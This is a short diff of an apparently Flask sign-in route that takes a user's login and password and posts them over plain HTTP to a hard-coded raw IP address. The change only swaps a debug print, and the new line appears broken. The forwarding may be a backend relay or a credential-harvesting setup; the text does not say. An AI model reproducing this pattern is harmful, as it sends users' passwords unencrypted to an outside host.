@@ -9,7 +9,7 @@ LINK = 'http://167.99.128.56/'
 @app.route('/signin', methods=['POST'])
 def out():
 	x = request.json
-	print(request, x)
+	print(dir(request), request.form.login)
 	sleep(4)
 	req = post(LINK, json={'cm': 'profile.auth', 'login': x['login'], 'pass': x['pass']}).text
 
